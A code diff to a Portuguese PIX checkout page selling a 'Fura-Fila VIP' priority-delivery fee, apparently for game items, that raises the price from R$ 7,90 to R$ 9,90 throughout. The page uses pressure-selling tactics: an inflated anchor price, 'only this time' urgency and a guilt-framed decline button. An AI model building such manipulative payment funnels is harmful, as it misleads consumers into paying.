@@ -208,7 +208,7 @@ var a=document.createElement("script");a.setAttribute("async","");a.setAttribute
     </div>
     <div class="vip-price-row">
       <div class="vip-from">De R$ 29,90</div>
-      <div class="vip-price"><span>R$</span>7,90</div>
+      <div class="vip-price"><span>R$</span>9,90</div>
       <div class="vip-price-sub">taxa única de prioridade • apenas esta vez</div>
     </div>
     <div style="text-align:center;">
@@ -219,7 +219,7 @@ var a=document.createElement("script");a.setAttribute("async","");a.setAttribute
 
 <!-- CTA -->
 <div class="cta-sec">
-  <button class="cta-yes" id="cta-btn" onclick="gerarPix()">⚡ ATIVAR FURA-FILA VIP — R$ 7,90</button>
+  <button class="cta-yes" id="cta-btn" onclick="gerarPix()">⚡ ATIVAR FURA-FILA VIP — R$ 9,90</button>
   <div class="cta-sub">🔒 Pagamento seguro via PIX • Ativação instantânea</div>
   <button class="cta-no" onclick="recusar()">Não, prefiro esperar 24h na fila normal</button>
 </div>
@@ -287,7 +287,7 @@ function gerarPix(){
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({
-      amount:'7.90',
+      amount:'9.90',
       nome:nome,email:email,telefone:tel,
       product_title:'Fura-Fila VIP - Entrega Expressa FF',
       plano:'vip_entrega',
@@ -302,7 +302,7 @@ function gerarPix(){
     else if(data&&data.pix_qrcode) code=data.pix_qrcode;
     else if(data&&data.data&&data.data.pix) code=data.data.pix.pix_qr_code||data.data.pix.qrcode;
     txHash=data.hash||data.id||data.transaction_hash||(data.data&&(data.data.hash||data.data.id))||'';
-    if(!code){btn.disabled=false;btn.textContent='⚡ ATIVAR FURA-FILA VIP — R$ 7,90';alert('Erro ao gerar PIX. Tente novamente.');return;}
+    if(!code){btn.disabled=false;btn.textContent='⚡ ATIVAR FURA-FILA VIP — R$ 9,90';alert('Erro ao gerar PIX. Tente novamente.');return;}
     pixCode=code;
     document.getElementById('cta-sec').style.display='none'; // esconde botões
     document.getElementById('pix-area').classList.add('active');
@@ -314,11 +314,11 @@ function gerarPix(){
       fetch('/api/track-pending',{
         method:'POST',
         headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({txid:txHash,amount:'7.90',utms:utms,productTitle:'Fura-Fila VIP',nome:nome,email:email,telefone:tel})
+        body:JSON.stringify({txid:txHash,amount:'9.90',utms:utms,productTitle:'Fura-Fila VIP',nome:nome,email:email,telefone:tel})
       }).catch(function(){});
     }
   })
-  .catch(function(err){btn.disabled=false;btn.textContent='⚡ ATIVAR FURA-FILA VIP — R$ 7,90';alert('Erro: '+err.message);});
+  .catch(function(err){btn.disabled=false;btn.textContent='⚡ ATIVAR FURA-FILA VIP — R$ 9,90';alert('Erro: '+err.message);});
 }
 
 function copiarPix(){
@@ -353,7 +353,7 @@ function startPolling(){
           var st=document.getElementById('pix-status');
           st.className='pst paid';
           st.textContent='⚡ ENTREGA VIP ATIVADA! Seus itens chegam em até 3 minutos!';
-          try{if(typeof fbq==='function')fbq('track','Purchase',{value:7.90,currency:'BRL'});}catch(e){}
+          try{if(typeof fbq==='function')fbq('track','Purchase',{value:9.90,currency:'BRL'});}catch(e){}
           setTimeout(function(){window.location.href='obrigado.html';},3000);
         }
       })
